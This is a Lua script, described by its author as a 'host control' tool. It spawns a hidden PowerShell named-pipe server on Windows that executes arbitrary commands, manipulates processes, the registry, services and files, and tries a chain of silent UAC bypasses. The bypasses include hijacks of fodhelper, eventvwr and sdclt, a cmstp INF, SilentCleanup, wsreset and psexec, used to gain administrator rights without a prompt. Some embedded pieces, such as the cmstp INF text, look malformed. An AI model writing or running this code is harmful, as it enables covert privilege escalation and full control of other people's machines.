-- dum little host control bullshit i made

local elevated=false
local pipeNon="\\\\.\\pipe\\pslua_non"
local pipeAdmin="\\\\.\\pipe\\pslua_admin"
local currentPipe=pipeNon
local hasWsl=false
local hasOs=type(os)=="table"
local hasIo=type(io)=="table"
local hasCoroutine=type(coroutine)=="table"
local hasTask=type(task)=="table"
local asyncWrap=hasTask and task.spawn or (hasCoroutine and coroutine.wrap or function(f)f()end)
local function has_io_popen()return hasIo and type(io.popen)=="function"end
local function has_os_execute()return hasOs and type(os.execute)=="function"end
local function emulate_popen(cmd)if not hasOs or not hasIo then error("no os/io")end local tmp=hasOs and os.tmpname()local fullCmd=cmd.." > \""..tmp.."\" 2>&1"if hasOs then os.execute(fullCmd)end local f=hasIo and io.open(tmp,"r")local content=""if f then content=f:read("*a")f:close()end if hasOs then os.remove(tmp)end local fake={}local done=false function fake:read()if done then return nil end done=true return content end function fake:close()end return fake end
local function unified_popen(cmd)if has_io_popen()then return io.popen(cmd)elseif has_os_execute()then return emulate_popen(cmd)else error("No io.popen or os.execute")end end
local psScript=[[$pipeName=$args[0];$isAdmin=([Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator);$pipe=New-Object System.IO.Pipes.NamedPipeServerStream($pipeName,[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::Asynchronous);while($true){try{$pipe.WaitForConnection()}catch{continue};$reader=New-Object System.IO.StreamReader($pipe);$writer=New-Object System.IO.StreamWriter($pipe);$writer.AutoFlush=$true;$cmd=$reader.ReadLine();if($cmd -eq 'exit'){break};if($cmd -match '^elevate (silent|ask)$'){$mode=$Matches[1];if($mode -eq 'silent'){try{New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force|Out-Null;Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "(Default)" "powershell.exe -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`" \\\"\\\\.\\pipe\\pslua_admin\\\"";Set-ItemProperty "HKCU:\Software\Classes\ms-settings\Shell\Open\command" "DelegateExecute" "";Start-Process "C:\Windows\System32\fodhelper.exe";Remove-Item "HKCU:\Software\Classes\ms-settings" -Recurse -Force}catch{};try{New-Item "HKCU:\Software\Classes\eudcedit\Shell\Open\command" -Force|Out-Null;Set-ItemProperty "HKCU:\Software\Classes\eudcedit\Shell\Open\command" "(Default)" "powershell.exe -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`" \\\"\\\\.\\pipe\\pslua_admin\\\"";Start-Process "eudcedit.exe";Remove-Item "HKCU:\Software\Classes\eudcedit" -Recurse -Force}catch{};try{New-Item "HKCU:\Software\Classes\mscfile\shell\open\command" -Force|Out-Null;Set-ItemProperty "HKCU:\Software\Classes\mscfile\shell\open\command" "(Default)" "powershell.exe -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`" \\\"\\\\.\\pipe\\pslua_admin\\\"";Start-Process eventvwr.exe;Remove-Item "HKCU:\Software\Classes\mscfile" -Recurse -Force}catch{};try{if(Get-Command psexec){psexec -s -d powershell.exe -WindowStyle Hidden -Command "$($MyInvocation.MyCommand.Definition)" "\\.\pipe\pslua_admin"}}catch{};try{New-Item "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8MSEUa\Shell\open\command" -Force|Out-Null;Set-ItemProperty "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8MSEUa\Shell\open\command" "(Default)" "powershell.exe -WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`" \\\"\\\\.\\pipe\\pslua_admin\\\"";Start-Process sdclt.exe /kickoffelev;Remove-Item "HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8MSEUa" -Recurse -Force}catch{};try{$infPath="$env:TEMP\cmstp.inf";$infContent='[version]Signature=$chicago$AdvancedINF=2.5[DefaultInstall]UnRegisterOCXs=UnRegSection[UnRegSection]Ini2Reg=%11%\cmstp.exe /ni /u';$infContent|Out-File $infPath;cmstp /ni /s $infPath /f /u;Remove-Item $infPath}catch{};try{Schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup" /I}catch{};try{Start-Process wsreset.exe}catch{};try{Start-Process computerdefaults.exe}catch{}}else{Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -Command `"$($MyInvocation.MyCommand.Definition)`" \\\"\\\\.\\pipe\\pslua_admin\\\"" -Verb RunAs};$out='elevate attempted'}elseif($cmd -eq 'is_elevated'){$out=$isAdmin}elseif($cmd -match '^kill (name|pid|regex) (.+)$'){$type=$Matches[1];$val=$Matches[2];try{if($type -eq 'name'){Stop-Process -Name $val -Force}elseif($type -eq 'pid'){Stop-Process -Id $val -Force}else{Get-Process|Where-Object {$_.ProcessName -match $val}|Stop-Process -Force}}$out='kill done'}catch{$out=$_.Exception.Message}}elseif($cmd -match '^reg (get|set|del) (.+) (.+)?$'){$op=$Matches[1];$key=$Matches[2];$val=$Matches[3];try{if($op -eq 'get'){$out=Get-ItemProperty $key|Out-String}elseif($op -eq 'set'){Set-ItemProperty $key $val}else{Remove-ItemProperty $key $val}$out='reg done'}catch{$out=$_.Exception.Message}}elseif($cmd -eq 'sysinfo'){$out=(Get-ComputerInfo|Out-String)}elseif($cmd -eq 'has_wsl'){if(Get-Command wsl -ErrorAction SilentlyContinue){$out='true'}else{$out='false'}}elseif($cmd -match '^service (start|stop|status) (.+)$'){$op=$Matches[1];$svc=$Matches[2];try{if($op -eq 'start'){Start-Service $svc}elseif($op -eq 'stop'){Stop-Service $svc}$out=Get-Service $svc|Out-String}catch{$out=$_.Exception.Message}}elseif($cmd -eq 'netstat'){$out=(netstat -ano|Out-String)}elseif($cmd -match '^file (read|write|del) (.+) (.+)?$'){$op=$Matches[1];$path=$Matches[2];$cont=$Matches[3];try{if($op -eq 'read'){$out=Get-Content $path -Raw}elseif($op -eq 'write'){$cont|Out-File $path}else{Remove-Item $path}$out='file op done'}catch{$out=$_.Exception.Message}}else{try{if($cmd.StartsWith('wsl ')){$out=wsl $cmd.Substring(4) 2>&1|Out-String}elseif($cmd.StartsWith('cmd /c ')){$out=Invoke-Expression $cmd 2>&1|Out-String}else{$out=Invoke-Expression $cmd 2>&1|Out-String}}catch{$out=$_.Exception.Message}};$writer.WriteLine($out);$pipe.Disconnect()};$pipe.Dispose()]]
if has_os_execute() then asyncWrap(function()os.execute('start "" powershell -WindowStyle Hidden -Command "'..psScript:gsub('"','\\"')..'" "'..pipeNon..'"')end)end
if hasOs then os.execute("ping 127.0.0.1 -n 3 >nul")end
local function sendCommand(cmd,pipe)pipe=pipe or currentPipe if not hasIo then return nil,"no io" end local p=io.open(pipe,"w+")if not p then return nil,"pipe fail" end p:write(cmd.."\n")p:flush()local out=p:read("*a")p:close()return out:gsub("\r\n$","")end
local function trySend(cmd)local out,err=sendCommand(cmd)if not out and elevated then currentPipe=pipeNon elevated=false out,err=sendCommand(cmd)end if not out then asyncWrap(function()if has_os_execute()then os.execute('start "" powershell -WindowStyle Hidden -Command "'..psScript:gsub('"','\\"')..'" "'..currentPipe..'"')end end)end return out,err end
local res=trySend("has_wsl")if res=="true" then hasWsl=true end
function cmd(command)local out=trySend("cmd /c "..command)return out end
function powershell(command)local out=trySend(command)return out end
pwsh=powershell
if hasWsl then function wsl(command)return trySend("wsl "..command)end end
function kill(type,val)return trySend("kill "..type.." "..val)end
function reg(op,key,val)return trySend("reg "..op.." "..key.." "..(val or ""))end
function sysinfo()return trySend("sysinfo")end
function service(op,name)return trySend("service "..op.." "..name)end
function netstat()return trySend("netstat")end
function file(op,path,content)return trySend("file "..op.." "..path.." "..(content or ""))end
function elevate(mode)local isElev=trySend("is_elevated")=="True"if isElev then elevated=true currentPipe=pipeAdmin return true end trySend("elevate "..mode)if hasOs then os.execute("ping 127.0.0.1 -n 5 >nul")end isElev=trySend("is_elevated",pipeAdmin)if isElev=="True" then currentPipe=pipeAdmin elevated=true return true else currentPipe=pipeNon elevated=false return false end end
function isElevated()local check=trySend("is_elevated")elevated=(check=="True")return elevated end
